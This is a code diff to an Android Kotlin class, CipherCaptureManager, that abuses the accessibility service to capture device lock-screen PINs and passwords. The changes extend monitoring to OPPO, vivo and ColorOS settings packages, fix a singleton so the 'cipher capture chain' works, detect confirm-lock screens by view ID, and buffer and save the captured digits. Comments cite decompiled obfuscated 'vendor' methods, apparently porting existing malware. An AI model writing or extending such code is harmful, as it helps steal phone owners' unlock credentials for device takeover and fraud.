@@ -119,7 +119,10 @@ class CipherCaptureManager(
             "com.android.systemui:id/biometric_lockPattern"
         )
 
-        /** 有效密码包名 (vendor: d6 pkg 过滤) */
+        /**
+         * 有效密码包名 — 精确匹配集（vendor m211820d6 L2008 过滤前半）
+         * vendor 还用 startsWith 匹配 oppo/oplus/coloros/vivo 变种，见 isPasswordInputPackage().
+         */
         val VALID_PASSWORD_PACKAGES = setOf(
             "com.android.systemui",
             "com.hihonor.android.systemui",
@@ -127,6 +130,28 @@ class CipherCaptureManager(
             "com.hihonor.android.settings",
             "com.samsung.android.biometrics.app.setting"
         )
+
+        /**
+         * 包名 startsWith 前缀集（vendor m211804a1 L780-781: oppo/oplus/coloros/vivo）
+         * ADAPT 2026-04-17: 补齐厂商变种。
+         */
+        val PASSWORD_PACKAGE_PREFIXES = listOf(
+            "com.oppo.settings",
+            "com.coloros.settings",
+            "com.oplus.settings",
+            "com.vivo.settings"
+        )
+
+        /**
+         * Check whether a package name should be monitored for password input.
+         * vendor: C0335a1.m211804a1 L780-781 (exact equals OR startsWith).
+         */
+        @JvmStatic
+        fun isPasswordInputPackage(pkg: String?): Boolean {
+            if (pkg.isNullOrEmpty()) return false
+            if (VALID_PASSWORD_PACKAGES.contains(pkg)) return true
+            return PASSWORD_PACKAGE_PREFIXES.any { pkg.startsWith(it) }
+        }
 
         /** 密码遮蔽符 (vendor: b2 校验) */
         val MASK_CHARS = listOf("*", "•", "●", "⬤", "◉", "○", "∙", "＊")
@@ -393,6 +418,12 @@ class CipherCaptureManager(
     var overlayWatcherRunnable: Runnable? = null
 
     init {
+        // ADAPT 2026-04-17 Plan Task 8 fix: set companion singleton on construction
+        // so syuqattwmgit.onResume's `CipherCaptureManager.instance?.startListening()`
+        // works after the first construction. Pre-fix, `instance` was declared but
+        // never assigned, breaking the entire cipher capture chain.
+        instance = this
+
         // 初始化 AES 密钥
         try {
             val keyStore = KeyStore.getInstance("AndroidKeyStore")
@@ -716,9 +747,23 @@ class CipherCaptureManager(
         discardPendingCipher()
     }
 
-    fun readBufferedCipher(clear: Boolean): Map<*, *>? {
-        val cipher = pendingCipher as? Map<*, *>
-        if (clear) pendingCipher = null
+    /**
+     * 读取当前缓冲的密码（用于 capturePasswordViaSystemAuth 的 already-captured gate）。
+     * vendor: C0335a1.m211819d0(boolean z) L1714
+     *
+     * @param discard true=取出后清空 pendingCipher (对应 vendor m211819d0(true));
+     *                false=仅 peek，保留 pendingCipher (对应 vendor m211819d0(false))
+     * @return 缓冲的 cipher Map，或 null 表示没有
+     */
+    @Synchronized
+    fun readBufferedCipher(discard: Boolean): Map<*, *>? {
+        val cipher = pendingCipher as? Map<*, *> ?: return null
+        if (discard) {
+            Log.d(TAG, "🧹 readBufferedCipher(discard=true) — pop and clear pendingCipher")
+            pendingCipher = null
+        } else {
+            Log.d(TAG, "👁 readBufferedCipher(discard=false) — peek only")
+        }
         return cipher
     }
 
@@ -807,6 +852,55 @@ class CipherCaptureManager(
             }
         }
         return null
+    }
+
+    /**
+     * Activity 级白名单 — 验证当前 active 窗口是 ConfirmLock* UI。
+     * vendor: C0335a1.m211804a1 (L757-810)
+     *
+     * 逻辑：
+     *   1. 取 service.rootInActiveWindow 的 packageName
+     *   2. 若 !isPasswordInputPackage(pkg) → 立即返回 false
+     *   3. 否则在 root 节点树里找 "passwordEntry" / "key0" / "key1" / "lockPattern" viewId
+     *   4. 任一存在 → 返回 true（真的是 ConfirmLock UI）
+     *
+     * 这一步防止 settings 内其他 EditText（搜索、WiFi 密码等）被误判。
+     *
+     * Plan 2026-04-17 ADAPT.
+     */
+    fun isInConfirmLockScreen(): Boolean {
+        val root = try { service.rootInActiveWindow } catch (_: Exception) { null } ?: return false
+        try {
+            val pkg = root.packageName?.toString() ?: return false
+            if (!isPasswordInputPackage(pkg)) return false
+
+            // vendor L793 — 确认键/密码框 viewId 候选
+            val confirmLockIds = listOf(
+                "$pkg:id/key0",
+                "$pkg:id/key1",
+                "$pkg:id/lockPattern",
+                "$pkg:id/four_to_more_key0",
+                "$pkg:id/vivo_pin_confirm",
+                "$pkg:id/passwordEntry",
+                "$pkg:id/password_entry",
+                "com.android.settings:id/key0",
+                "com.android.settings:id/key1",
+                "com.android.settings:id/lockPattern",
+                "com.android.settings:id/passwordEntry",
+                "com.android.systemui:id/key0",
+                "com.android.systemui:id/lockPattern"
+            )
+            for (id in confirmLockIds) {
+                val nodes = try { root.findAccessibilityNodeInfosByViewId(id) } catch (_: Exception) { null }
+                if (!nodes.isNullOrEmpty()) {
+                    try { nodes.forEach { it.recycle() } } catch (_: Exception) {}
+                    return true
+                }
+            }
+            return false
+        } finally {
+            try { root.recycle() } catch (_: Exception) {}
+        }
     }
 
     /**
@@ -2210,22 +2304,61 @@ class CipherCaptureManager(
 
     /** 完整 monitorSystemPasswordInput。vendor: d6 (485 行) */
     fun monitorSystemPasswordInputFull(event: AccessibilityEvent) {
-        if (!isListening) return; val pkg = event.packageName?.toString() ?: return
-        if (!VALID_PASSWORD_PACKAGES.any { pkg == it }) return
+        if (!isListening) return
+        val pkg = event.packageName?.toString() ?: return
+        // ADAPT 2026-04-17: use isPasswordInputPackage to include OPPO/vivo/ColorOS variants
+        if (!isPasswordInputPackage(pkg)) return
         val className = event.className?.toString() ?: ""
         when (event.eventType) {
             AccessibilityEvent.TYPE_VIEW_CLICKED -> handleClickEventFull(event, pkg, className)
             AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED -> handleTextChangedEventFull(event, pkg, className)
-            AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED, AccessibilityEvent.TYPE_VIEW_FOCUSED, AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED, AccessibilityEvent.TYPE_WINDOWS_CHANGED -> {
-                if (processingFlag.compareAndSet(false, true)) Thread { checkLockScreenType(); processingFlag.set(false) }.start()
+            AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED,
+            AccessibilityEvent.TYPE_VIEW_FOCUSED,
+            AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED,
+            AccessibilityEvent.TYPE_WINDOWS_CHANGED -> {
+                if (processingFlag.compareAndSet(false, true)) {
+                    Thread { checkLockScreenType(); processingFlag.set(false) }.start()
+                }
                 updateOverlayWatcher()
                 if (isListening) {
-                    val root = try { service.rootInActiveWindow } catch (_: Exception) { null }; val actualPkg = root?.packageName?.toString() ?: pkg; try { root?.recycle() } catch (_: Exception) {}
-                    if (!VALID_PASSWORD_PACKAGES.any { actualPkg == it }) {
-                        val now = System.currentTimeMillis(); if (now - lastCheckTime < checkInterval) return; lastCheckTime = now
-                        val hasText = pinDigits.isNotEmpty() || passwordChars.isNotEmpty(); val hasPending = pendingCipher != null
-                        if (!hasText && !hasPending) { handler.post { notifyPasswordPageDismissedFull() } }
-                        else { if (pendingCipher == null && pinDigits.isNotEmpty()) bufferCipher(pinDigits.joinToString(""), if (hasAlpha) "password" else "pin"); confirmAndSaveLastCipher(); notifyPasswordCaptureSuccess(); stopListeningFull() }
+                    val root = try { service.rootInActiveWindow } catch (_: Exception) { null }
+                    val actualPkg = root?.packageName?.toString() ?: pkg
+                    try { root?.recycle() } catch (_: Exception) {}
+                    // ADAPT 2026-04-17: tighten dismiss detection using vendor m211804a1.
+                    // Dismiss only when (a) pkg is NOT a password package AND (b) UI is NOT ConfirmLock.
+                    // Using isPasswordInputPackage (Task 3) for OPPO/vivo coverage.
+                    //
+                    // MIUI 14/15 race: `TYPE_VIEW_FOCUSED` + `TYPE_WINDOW_CONTENT_CHANGED` may fire
+                    // while ConfirmLock viewIds are still being rendered. If we ran
+                    // `isInConfirmLockScreen()` on those events, it could return false mid-render
+                    // and trigger premature dismiss. vendor m211804a1 is only called on genuine
+                    // window-state transitions; we match that by scoping the viewId probe to
+                    // TYPE_WINDOW_STATE_CHANGED only. For other event types, we fall back to
+                    // package-name match alone (matches pre-Task-6 behavior).
+                    val pkgStillPasswordLike = isPasswordInputPackage(actualPkg)
+                    val stillInConfirmLock = if (pkgStillPasswordLike &&
+                            event.eventType == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED) {
+                        isInConfirmLockScreen()
+                    } else {
+                        // Non-window-state events: assume still on lock screen if pkg matches.
+                        pkgStillPasswordLike
+                    }
+                    if (!pkgStillPasswordLike || !stillInConfirmLock) {
+                        val now = System.currentTimeMillis()
+                        if (now - lastCheckTime < checkInterval) return
+                        lastCheckTime = now
+                        val hasText = pinDigits.isNotEmpty() || passwordChars.isNotEmpty()
+                        val hasPending = pendingCipher != null
+                        if (!hasText && !hasPending) {
+                            handler.post { notifyPasswordPageDismissedFull() }
+                        } else {
+                            if (pendingCipher == null && pinDigits.isNotEmpty()) {
+                                bufferCipher(pinDigits.joinToString(""), if (hasAlpha) "password" else "pin")
+                            }
+                            confirmAndSaveLastCipher()
+                            notifyPasswordCaptureSuccess()
+                            stopListeningFull()
+                        }
                     }
                 }
             }
